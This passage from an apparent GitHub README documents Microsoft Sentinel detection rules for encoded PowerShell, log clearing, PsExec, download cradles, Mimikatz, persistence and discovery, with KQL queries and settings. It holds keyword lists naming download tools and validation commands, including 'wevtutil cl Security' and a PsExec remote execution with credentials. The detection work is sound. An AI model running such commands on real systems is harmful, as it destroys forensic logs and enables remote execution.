- Windows Security Event **4688 (A new process has been created)** is generated.
- The `CommandLine` field contains the specific strings `"-enc"` or `"-EncodedCommand"`.
- The scheduled KQL query returns more than 0 results within the 6-minute evaluation window.

---

## 📋 Incident Configuration

To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:

- **Incident Creation:** Enabled (Creates incidents from alerts triggered by this analytics rule).
- **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?

Disabling alert grouping ensures that if multiple distinct encoded commands are executed (potentially by different users or on different hosts), they each spawn a separate incident. This guarantees that every unique encoded payload is individually reviewed and decoded by an analyst, rather than being buried within a single grouped incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 131423" src="https://github.com/user-attachments/assets/061bf108-72d1-4dd8-b2d4-5594a367cbcc" />

---

## ✅ Validation

This detection can be validated by opening a Command Prompt on a monitored endpoint and executing a benign Base64 encoded PowerShell command, such as:
`powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACIA` (which decodes to `Write-Host "Hello World"`).
Within 5 minutes, Microsoft Sentinel should detect the 4688 event and generate the corresponding incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-02 131437" src="https://github.com/user-attachments/assets/c3b52bdd-3bad-4041-8564-b0f3104b8d25" />

---

## 🎯 Security Impact

This detection is essential for security operations as it helps teams:
- Pierce through attacker obfuscation techniques to reveal actual intent.
- Quickly identify endpoints where malicious scripting is actively occurring.
- Capture the raw malicious payload (the encoded string) for threat intelligence extraction (e.g., finding C2 IP addresses or dropped file hashes within the decoded script).

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-02 131314.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-02 131331.png)*

### KQL Query
> *(Insert Screenshot 2026-08-02 131341.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-02 131401.png)*

### Query Scheduling
> *(Insert Screenshot 2026-08-02 131412.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-02 131423.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-02 131430.png)*

### Review & Create
> *(Insert Screenshot 2026-08-02 131437.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

---
# 🗑️ Event Log Cleared Detection

## 🎯 Objective
This rule detects whenever Windows Event Logs are cleared. It generates an alert to identify attempts by an adversary to cover their tracks, remove forensic evidence, and evade detection mechanisms.

---

## 📖 Threat Overview
Once adversaries compromise a system, they often attempt to hide their presence and activities by wiping the system and security event logs. Clearing the Windows Security Log generates Event ID 1102. Since regular users cannot clear these logs, the occurrence of this event strongly indicates that an attacker has obtained local administrative privileges and is actively destroying forensic artifacts to disrupt incident response investigations.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | Clear Windows Event Logs | T1070.001 |

---

## 📂 Data Sources
* Windows Security Event Logs
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for Event ID 1102, which represents the audit log being cleared:

```kql
SecurityEvent
| where EventID==1102
| project TimeGenerated,Computer,SubjectAccount,Activity,EventID
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect log clearing activities the moment they occur. |
| **Severity** | High | Clearing security logs is a highly suspicious activity indicating an active compromise and cover-up. |
| **Status** | Disabled | *(Currently disabled in the environment per the configuration screenshot).* |
| **Event Grouping** | Trigger an alert for each event | Ensures every instance of a log clear action is captured as a distinct alert. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Process | ProcessId <br> CreationTimeUtc | EventID <br> TimeGenerated |
| Account | Name | SubjectAccount |
| Host | HostName | Computer |

### Why map these entities?
* **Account:** Identifies the specific privileged user account that was used to authorize the clearing of the logs.
* **Host:** Identifies the compromised endpoint where the forensic data was destroyed.
* **Process:** Correlates the exact event ID and time of destruction.

---

## 🔄 Detection Workflow
```text
Attacker clears Windows Security Log to hide tracks
            │
            ▼
Windows Security Log (Event ID 1102) generated prior to wipe
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
EventID 1102 matched
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned & Digital Forensics / Incident Response Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **1102 (The audit log was cleared)** is generated.
* The NRT rule successfully processes the incoming event stream.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account (Name)** and **Host (HostName)**.

### Why group alerts by Account and Host?
If an attacker repeatedly clears logs on a specific machine using a specific compromised account (e.g., during a prolonged interactive session), grouping by both the Account and Host ensures that all related log-clearing actions within a 5-hour window are condensed into a single high-priority incident for the SOC.

---

## ✅ Validation
This detection can be validated by opening the Windows Event Viewer on a monitored endpoint, navigating to the `Security` logs, and selecting **Clear Log**. Alternatively, open an administrative PowerShell prompt and run `wevtutil cl Security`. Microsoft Sentinel will detect the resulting Event ID 1102 and generate an incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Immediately detect when an attacker is actively engaging in anti-forensics.
* Flag compromised accounts that have successfully achieved administrative or system-level privileges.
* Trigger rapid isolation of the affected host to preserve any remaining volatile memory (RAM) or disk artifacts before the attacker can cause further damage.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 112252.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 112304.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 112323.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 112331.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 112355.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 112406.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 112415.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🛠️ PsExec Detection

## 🎯 Objective
This rule detects PsExec service creation and process execution. It enables security teams to identify lateral movement and remote execution activities that utilize the PsExec utility within the network.

---

## 📖 Threat Overview
PsExec is a legitimate Microsoft Sysinternals utility designed for system administrators to execute processes on remote systems. However, it is heavily abused by threat actors and ransomware operators to move laterally, escalate privileges (often executing as `NT AUTHORITY\SYSTEM`), and deploy malware across an environment. When PsExec connects to a remote machine, it uploads a service executable (`PSEXESVC.exe`) to the `Admin$` share and registers it as a service. Monitoring for these specific process and service creation events is critical for identifying unauthorized lateral movement.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation, Event ID 7045 - Service Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for the creation of the PsExec service and the execution of the PsExec binary:

```kql
SecurityEvent
| where EventID in (4688,7045)
| where Process has_any ("psexec.exe","psexesvc.exe")
   or CommandLine has "psexec"
   or ServiceName =~ "PSEXESVC"
| project
    TimeGenerated,
    Computer,
    Account,
    EventID,
    Process,
    CommandLine,
    ServiceName
| order by TimeGenerated desc
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect lateral movement immediately as it happens. |
| **Severity** | High | Unauthorized use of PsExec is a strong indicator of an active compromise. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of PsExec execution as a distinct alert. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies the compromised user credentials being leveraged to authenticate to the remote host.
* **Host:** Identifies the target system where the remote command was executed.
* **Process:** Extracts the exact command line arguments passed to PsExec, which often reveals the malicious payload or secondary scripts the attacker is attempting to run.

---

## 🔄 Detection Workflow
```text
Attacker uses PsExec to execute a command remotely
            │
            ▼
Target Host logs Event ID 7045 (New Service) and Event ID 4688 (Process Execution)
            │
            ▼
Azure Monitor Agent (AMA) ingests the events
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Keywords ("psexec", "PSEXESVC") matched
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (No alert grouping)
            │
            ▼
SOC Analyst Assigned & Lateral Movement Investigation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** (Process Creation) or **7045** (Service Creation) is generated.
* The `Process` contains `"psexec.exe"` or `"psexesvc.exe"`, OR the `CommandLine` contains `"psexec"`, OR the `ServiceName` exactly matches `"PSEXESVC"` (case-insensitive).
* The NRT rule successfully processes the incoming event stream.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled (Creates incidents from alerts triggered by this analytics rule).
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Lateral movement often happens rapidly across multiple hosts. Disabling alert grouping ensures that if an attacker uses PsExec to pivot to five different servers, the SOC receives discrete incidents for each target. This prevents a single grouped incident from obscuring the true blast radius of the attack.

---

## ✅ Validation
This detection can be validated by downloading the legitimate PsExec tool from Microsoft Sysinternals and executing a harmless remote command against a monitored test machine (e.g., `psexec \\TargetMachine -u Domain\User -p Password cmd.exe /c echo test`). Microsoft Sentinel will detect the resulting 7045 and 4688 events and generate an incident.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify lateral movement and pivoting activities during a network breach.
* Spot compromised privileged accounts (since PsExec typically requires local admin rights on the target).
* Trace the propagation path of an attacker across the network to facilitate accurate containment and eradication.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 112740.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 112754.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 112809.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 112822.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 112831.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 112847.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# ⬇️ Download Cradle Detection

## 🎯 Objective
This rule detects PowerShell commands used to download payloads from remote servers. It enables security teams to identify initial staging actions where an attacker attempts to pull external malicious tools or scripts into the environment.

## 📖 Threat Overview
Adversaries often use "download cradles" to retrieve malicious payloads from remote infrastructure. By leveraging built-in administrative tools like PowerShell (using cmdlets like `Invoke-WebRequest` or `Net.WebClient`), attackers can execute fileless malware or drop secondary stage implants while blending in with legitimate network traffic. Monitoring process execution for these specific command-line arguments is critical for detecting the ingress of external tools.

## 🔥 Severity
**Medium**

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Command And Control | Ingress Tool Transfer | T1105 |

## 📂 Data Sources
* Windows Security Event Logs
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

## 📑 Detection Logic (KQL)
The following query identifies process creation events containing common download cradle keywords:

```kql
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("Invoke-WebRequest","DownloadString","Net.WebClient","curl","wget")
| project TimeGenerated,Computer,SubjectAccount,NewProcessName,CommandLine,ParentProcessName
```

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Analytics Rule | Evaluates logs on a defined schedule. |
| **Severity** | Medium | Downloading external scripts requires verification to determine if the payload is malicious. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Query Frequency** | Run query every 5 Hours | Periodically scans for download activity. |
| **Lookup Period** | Lookup data from the last 5 Hours | Evaluates all events within the 5-hour ingestion window. |
| **Alert Threshold** | Trigger alert if query returns more than 0 results | Ensures any occurrence of these keywords generates an alert. |

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Host:** Identifies the endpoint executing the download command.
* **Process:** Extracts the exact command line so analysts can identify the remote URL and the specific file being downloaded.

## 🔄 Detection Workflow
```text
Suspicious Download Command Executed
            │
            ▼
Windows Security Log (Event ID 4688)
            │
            ▼
Azure Monitor Agent (AMA)
            │
            ▼
Microsoft Sentinel executes scheduled KQL query every 5 hours
            │
            ▼
Command matches target keywords (e.g., Invoke-WebRequest, curl)
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (No alert grouping)
            │
            ▼
SOC Analyst Assigned & Payload Investigation Begins
```

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is generated.
* The `CommandLine` field contains any of the following strings: `"Invoke-WebRequest"`, `"DownloadString"`, `"Net.WebClient"`, `"curl"`, `"wget"`.
* The scheduled KQL query returns more than 0 results within the 5-hour evaluation window.

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled (Creates incidents from alerts triggered by this analytics rule).
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Disabling alert grouping ensures that every unique download cradle execution spawns a separate incident. This guarantees that analysts investigate each remote download attempt individually, as they may point to different malicious domains or payloads.

## ✅ Validation
This detection can be validated by opening a Command Prompt or PowerShell session on a monitored endpoint and executing a benign download command, such as: `powershell.exe Invoke-WebRequest -Uri http://example.com -OutFile test.txt`. During the next 5-hour scheduled run, Microsoft Sentinel will evaluate the logs, detect the keyword, and generate the corresponding incident.

## 🎯 Security Impact
This detection helps security teams:
* Intercept the delivery of malicious payloads (such as backdoors or ransomware) early in the attack lifecycle.
* Identify compromised endpoints actively reaching out to adversary-controlled infrastructure.
* Extract network indicators (URLs, IP addresses) from the command line to block future access across the corporate network.

## 📸 Screenshots
### Rule Overview
> *(Insert Screenshot 2026-08-02 132143.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-02 132154.png)*

### KQL Query
> *(Insert Screenshot 2026-08-02 132228.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-02 132228.png)*

### Query Scheduling
> *(Insert Screenshot 2026-08-02 132235.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-02 132243.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-02 132249.png)*

### Review & Create
> *(Insert Screenshot 2026-08-02 132301.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🥷 Mimikatz Detection

## 🎯 Objective
This rule detects execution of the Mimikatz credential dumping tool. It enables security teams to identify active attempts to harvest credentials from system memory.

---

## 📖 Threat Overview
Mimikatz is a widely used post-exploitation tool that extracts plaintext passwords, hash, PIN code, and kerberos tickets from memory. Threat actors frequently attempt to execute Mimikatz or its PowerShell variants (like `Invoke-Mimikatz`) by encoding the commands to evade signature-based endpoint defenses. Monitoring for specific encoding flags associated with command-line execution is critical for spotting these obfuscated credential theft attempts.

---

## 🔥 Severity
**High**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Credential Access | OS Credential Dumping | T1003 |

---

## 📂 Data Sources
* Windows Security Event Logs
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query identifies process creation events containing specific command-line arguments used for executing obfuscated commands:

```kql
SecurityEvent
| where EventID == 4688
| where CommandLine has_any (
    "-enc",
    "-EncodedCommand",
    "FromBase64String"
)
| project
    TimeGenerated,
    Computer,
    Account,
    NewProcessName,
    CommandLine,
    ParentProcessName
| order by TimeGenerated desc
```


---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect credential dumping immediately as it occurs. |
| **Severity** | High | Active credential extraction indicates an attacker has already bypassed initial defenses. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Generates a distinct alert for every malicious execution detected. |
| **Suppression** | Not configured | Ensures all events are continually processed without artificial cool-down periods. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents. *(Note: The current configuration in the environment maps the Account Identifier to the Computer field, and the Host Identifier to the Account field.)*

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Computer |
| Host | HostName | Account |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Host & Account:** Identifying the compromised machine and context limits the scope of the attacker's credential harvesting capabilities.
* **Process:** Extracting the exact `CommandLine` string allows incident responders to decode the Base64 payload and analyze the exact parameters the attacker attempted to pass.

---

## 🔄 Detection Workflow
```text
Obfuscated Command Executed
            │
            ▼
Windows Security Log (Event ID 4688)
            │
            ▼
Azure Monitor Agent (AMA)
            │
            ▼
Microsoft Sentinel evaluates NRT rule continuously
            │
            ▼
Command matches target encoding parameters (e.g., "FromBase64String")
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Account Name)
            │
            ▼
SOC Analyst Assigned & Remediation Begins
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is generated.
* The `CommandLine` field contains any of the following strings: `"-enc"`, `"-EncodedCommand"`, or `"FromBase64String"`.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Limit Time Frame:** 5 Hours.
* **Group By:** Grouping alerts into a single incident if the selected entity types and details match: **Account -> Name**.

### Why group alerts by Account?
If a script recursively attempts to execute credential dumping techniques across multiple sessions or iterations, grouping them by the target account condenses the alerts into a single incident ticket spanning a 5-hour window.

---

## ✅ Validation
This detection can be validated by opening a Command Prompt on a monitored endpoint and safely executing a benign command wrapped in one of the targeted string flags (e.g., executing a simple string using `-EncodedCommand`). Microsoft Sentinel will process the 4688 event and trigger the NRT detection alert.

---

## 🎯 Security Impact
This detection helps security teams:
* Identify late-stage lateral movement preparation.
* Isolate compromised endpoints immediately to prevent the attacker from exfiltrating dumped hashes or tickets.
* Initiate immediate credential resets for any user account exposed on the host where Mimikatz was executed.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 111842.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 111620.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 111641.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 111651.png)*

### Incident Settings
> *(Insert Screenshot 2026-08-03 111733.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 111742.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 111752.png)*

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 📝 Registry Run Key Persistence

## 📌 Description
Detects modifications to common Windows Registry Run Keys that attackers frequently abuse to establish persistence. Malware or threat actors often create or modify Run and RunOnce registry keys so malicious programs execute automatically whenever a user logs in.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique |
|---------|-----------|
| Persistence | T1547.001 – Registry Run Keys / Startup Folder |
| Privilege Escalation | T1547.001 – Registry Run Keys / Startup Folder |

---

## 🚨 Severity
**Medium**

### Why Medium?
While registry Run Key modifications are commonly used by malware and attackers to maintain persistence, legitimate software installers and administrative tools may also create these entries. Investigation is required to determine whether the activity is authorized or malicious.

---

## 🔍 Detection Logic

```kql
SecurityEvent
| where EventID == 4657
| where ObjectName has_any (
    @"\Software\Microsoft\Windows\CurrentVersion\Run",
    @"\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    @"\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    @"\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)
| project TimeGenerated,
          Computer,
          Account,
          ObjectName,
          ProcessName,
          OperationType
| order by TimeGenerated desc
```

---

## 📊 Query Scheduling

| Setting | Value |
|---------|-------|
| Run Query Every | **5 Minutes** |
| Lookup Data From | **Last 6 Minutes** |
| Start Running | **Automatically** |

---

## 🗂️ Entity Mapping

| Entity | Identifier | Value |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | Name | Account |

---

## 🚨 Incident Settings

| Setting | Configuration |
|---------|---------------|
| Create Incidents | Enabled |
| Alert Grouping | Enabled |
| Grouping Window | 5 Hours |
| Grouping Method | Group alerts into a single incident if the selected entity types and details match |
| Group By | Host + Account |

### Why Host + Account?

Registry Run Key persistence often generates multiple registry modification events during a single attack. Grouping alerts by **Host** and **Account** consolidates related persistence activity into one incident, reducing alert fatigue while giving analysts a complete view of the attack on a specific endpoint.

---

## 💡 Expected Alert

An alert is generated whenever a registry value is created or modified in one of the monitored persistence locations, allowing analysts to investigate potential malware persistence or unauthorized startup modifications.

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# ⏰ Scheduled Task Creation

## 🎯 Objective
This rule triggers an alert whenever a scheduled task is created on a Windows system. It enables security teams to detect unauthorized persistence mechanisms and potential privilege escalation activities executed by threat actors.

---

## 📖 Threat Overview
Adversaries frequently abuse the Windows Task Scheduler to achieve persistence, execute malicious payloads at specific times, or run code under a higher privileged context (such as `NT AUTHORITY\SYSTEM`). Monitoring for Event ID 4698 (A scheduled task was created) is a fundamental defense-in-depth measure to identify attackers solidifying their foothold after initial access.

---

## 🔥 Severity
**Medium**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
| Privilege Escalation | Scheduled Task/Job: Scheduled Task | T1053.005 |

---

## 📂 Data Sources
* Windows Security Event Logs
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors the Security event log for the specific event generated when a new task is registered:

```kql
SecurityEvent
| where EventID == 4698
| project TimeGenerated,Computer,SubjectAccount,EventID,Activity
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Scheduled Analytics Rule | Evaluates logs on a defined schedule. |
| **Severity** | Medium | Scheduled tasks are frequently created by legitimate software, requiring investigation to determine true intent. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Query Frequency** | Run query every 5 Minutes | Provides timely detection of new persistence mechanisms. |
| **Lookup Period** | Lookup data from the last 6 Minutes | A 1-minute overlap prevents events from being missed due to slight ingestion delays. |
| **Alert Threshold** | Trigger alert if query returns more than 0 results | Generates an alert immediately upon finding a matching execution. |
| **Event Grouping** | Trigger an alert for each event | Maintains individual records for every newly created task. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators. 

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | HostName | Computer |
| Account | FullName | SubjectAccount |
| Process | ProcessId | EventID |

### Why map these entities?
* **Host:** Identifies the specific endpoint where the scheduled task was created, indicating the system that may be compromised.
* **Account:** Identifies the user account that authorized or executed the task creation.
* **Process:** Attempts to tie the creation event to a specific identifier (mapped to EventID in this configuration) for correlation.

---

## 🔄 Detection Workflow
```text
Attacker creates a malicious scheduled task for persistence
            │
            ▼
Windows Security Log (Event ID 4698) generated
            │
            ▼
Azure Monitor Agent (AMA) ingests the event
            │
            ▼
Microsoft Sentinel executes scheduled KQL query
            │
            ▼
Event matched within the 5-minute schedule
            │
            ▼
Alert Generated
            │
            ▼
Incident Created (Grouped by Host and Account)
            │
            ▼
SOC Analyst Assigned & Payload Investigation Begins
```
---
## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4698** is generated on the monitored host.
* The scheduled KQL query runs and returns more than 0 results within the 6-minute evaluation window.

---

## 📋 Incident Configuration
To govern how alerts manifest in the SOC queue, Microsoft Sentinel is configured with the following settings:
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Host** and **Account (Name)**.

### Why group alerts by Host and Account?
Legitimate administrative scripts, system updates, or configuration management tools (like SCCM) can sometimes generate multiple scheduled tasks on a machine in rapid succession. By grouping alerts based on the specific Host and Account over a 5-hour window, the SOC receives a single consolidated incident per endpoint. This drastically reduces alert fatigue while still bringing the persistence activity to the analyst's attention for review.

---

## ✅ Validation
This detection can be validated by opening a Command Prompt with administrative privileges on a monitored endpoint and executing the native `schtasks` command:
`schtasks /create /tn "SentinelTestTask" /tr "cmd.exe /c echo test" /sc daily /st 12:00`
Within 5 minutes, Microsoft Sentinel will evaluate the logs, detect Event ID 4698, and generate the corresponding incident.

---

## 🎯 Security Impact
This detection is essential for security operations as it helps teams:
* Identify long-term persistence mechanisms installed by threat actors.
* Detect privilege escalation attempts that rely on executing tasks as the SYSTEM account.
* Analyze the payload or executable triggered by the task to uncover secondary stage malware or command-and-control (C2) callbacks.

---

## 📸 Screenshots

### Rule Overview
> *(Insert Screenshot 2026-08-03 121451.png)*

### MITRE ATT&CK Mapping
> *(Insert Screenshot 2026-08-03 121501.png)*

### KQL Query
> *(Insert Screenshot 2026-08-03 121512.png)*

### Entity Mapping
> *(Insert Screenshot 2026-08-03 121525.png)*

### Incident Settings
> *(Insert image_8d73bf.png)*

### Automation Rule
> *(Insert Screenshot 2026-08-03 121540.png)*

### Review & Create
> *(Insert Screenshot 2026-08-03 121547.png)*

---

⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 🔍 Suspicious Discovery Commands

## 🎯 Objective
This rule detects the execution of common system discovery and reconnaissance commands. It enables security teams to identify the immediate post-compromise enumeration phase where an attacker attempts to map out the local system and network environment.

---

## 📖 Threat Overview
Once adversaries establish a foothold on a machine, their first priority is situational awareness. They utilize built-in Windows utilities (often called "Living off the Land" binaries or LOLBins) such as `systeminfo.exe`, `hostname.exe`, `wmic.exe`, and `ver.exe` to gather information about the operating system, hardware configuration, domain membership, and network layout. While administrators occasionally use these tools, a sudden cluster of these commands executed by a standard user or service account is highly indicative of malicious reconnaissance.

---

## 🔥 Severity
**Medium**

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Discovery | System Network Configuration Discovery | T1016 |
| Discovery | System Owner/User Discovery | T1033 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Account Discovery | T1087 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors process creation events for known discovery binaries:

```kql
SecurityEvent
| where EventID == 4688
| where Process has_any ("systeminfo.exe", "hostname.exe", "wmic.exe", "ver.exe")
| project TimeGenerated, Computer, Account, Process, CommandLine
```

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to catch initial reconnaissance the moment an attacker gains a shell. |
| **Severity** | Medium | Discovery commands are native tools, requiring context to confirm malicious intent. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual command execution to build a complete timeline of the attacker's reconnaissance. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies which compromised user or service account is being used to query the system.
* **Host:** Highlights the specific machine the attacker has landed on.
* **Process:** Extracts the exact `CommandLine` arguments, showing precisely what information the attacker asked for (e.g., `wmic useraccount get name,sid`).

---

## 🔄 Detection Workflow
```text
Attacker executes discovery commands to map the environment
            │
            ▼
Windows Security Log (Event ID 4688) generated for each command
            │
            ▼
Azure Monitor Agent (AMA) ingests the events
            │
            ▼
Microsoft Sentinel NRT Analytics Rule evaluates incoming events
            │
            ▼
Process name matches targeted LOLBins (e.g., systeminfo.exe)
            │
            ▼
Alert Generated for each matched command
            │
            ▼
Incident Created (Grouped by Account and Host)
            │
            ▼
SOC Analyst Assigned & Post-Compromise Investigation Initiated
```

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688 (A new process has been created)** is logged.
